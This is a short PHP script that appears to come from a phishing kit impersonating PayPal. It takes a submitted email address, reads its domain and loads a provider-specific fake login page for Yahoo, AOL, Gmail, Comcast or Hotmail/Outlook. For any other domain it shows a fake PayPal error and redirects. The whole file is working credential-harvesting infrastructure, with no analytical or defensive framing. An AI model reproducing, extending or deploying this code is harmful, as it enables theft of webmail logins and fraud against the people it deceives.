<?php
session_start();
require_once('../get_setting.php');
$_SESSION['email'] = $_POST['email'];
$email = explode("@",$_SESSION['email']);

if(preg_match('/yahoo/', $email[1]) or preg_match('/ymail/', $email[1])) {
	require_once("../files/login-yahoo.php");
}else if(preg_match('/aol/', $email[1])) {
	require_once("../files/login-aol.php");
}else if(preg_match('/gmail/', $email[1])) {
	require_once("../files/login-gmail.php");
}else if(preg_match('/comcast/', $email[1])) {
	require_once("../files/login-comcast.php");
}else if(preg_match('/hotmail/', $email[1]) or preg_match('/live/', $email[1]) or preg_match('/outlook/', $email[1]) or preg_match('/msn/', $email[1]) or preg_match('/passport/', $email[1])) {
	require_once("../files/login-hotmail.php");
}else{
	echo "<script>alert('Sorry your email is not connected to PayPal, please try again.');window.location='https://".$_SERVER['SERVER_NAME']."?".$site_parameter."';</script>";
}